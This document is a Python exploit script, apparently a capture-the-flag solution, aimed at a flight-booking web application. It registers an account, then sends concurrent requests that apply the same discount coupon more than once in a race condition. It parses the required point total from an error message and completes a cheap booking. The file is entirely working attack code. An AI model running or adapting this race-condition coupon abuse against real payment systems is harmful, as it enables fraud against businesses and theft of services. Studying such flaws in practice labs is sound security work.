import requests
import time
import concurrent.futures

BASEURL = "http://air.vulunch.kr"

session = requests.Session()

# register
userData = {
    "name": "tafka-" + str(int(time.time())),
    "password": "tafka4tafka4!",
    "email": "tafka4@gmail.com",
    "phoneNumber": "01012345678"
}

print(f"userData: {userData}")

session.post(f"{BASEURL}/register", data=userData, headers={"Content-Type": "application/x-www-form-urlencoded"})

# login
session.post(f"{BASEURL}/login", data={"name": userData["name"], "password": userData["password"]}, headers={"Content-Type": "application/x-www-form-urlencoded"})

# payment init
response = session.post(f"{BASEURL}/api/reservations/payment/initiate", json={"flightId": 1, "seatNumbers": ["21A"]}, headers={"Content-Type": "application/json"})
pay_session = response.json()["sessionId"]

# get amount
response = session.get(f"{BASEURL}/api/flights/1/pricing?seatClass=first", headers={"Content-Type": "application/json"})
fule_price = response.json()["fuelPrice"]
seat_price = response.json()["seatPrice"]

def apply_coupon(session, price_type, pay_session):
    data = {
        "sessionId": pay_session,
        "couponCode": "WELCOME90",
        "targetPriceType": price_type
    }
    session.post(f"{BASEURL}/api/reservations/payment/apply-coupon", json=data, headers={"Content-Type": "application/json"})

print(f"fuel_price: {fule_price}")
print(f"seat_price: {seat_price}")
print(f"total_price: {fule_price + seat_price}")
print(f"payment_session: {pay_session}")


with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = []
    futures.append(executor.submit(apply_coupon, session, "seat", pay_session))
    futures.append(executor.submit(apply_coupon, session, "fuel", pay_session))
    futures.append(executor.submit(apply_coupon, session, "seat", pay_session))
    futures.append(executor.submit(apply_coupon, session, "fuel", pay_session))
    concurrent.futures.wait(futures)

# create booking
bookingData = {
    "sessionId": pay_session,
    "usedPoints": 95000,
    "passengerName": "Tafka4",
    "passengerBirth": "1990-01-01"
}

failed_booking = session.post(f"{BASEURL}/api/reservations/create", json=bookingData, headers={"Content-Type": "application/json"})
print(failed_booking.text)
pay_point = int(failed_booking.json()["message"].split("(")[2].split(")")[0])
print(f"pay_point: {pay_point}")

bookingData["usedPoints"] = pay_point

response = session.post(f"{BASEURL}/api/reservations/create", json=bookingData, headers={"Content-Type": "application/json"})
print(response.text)










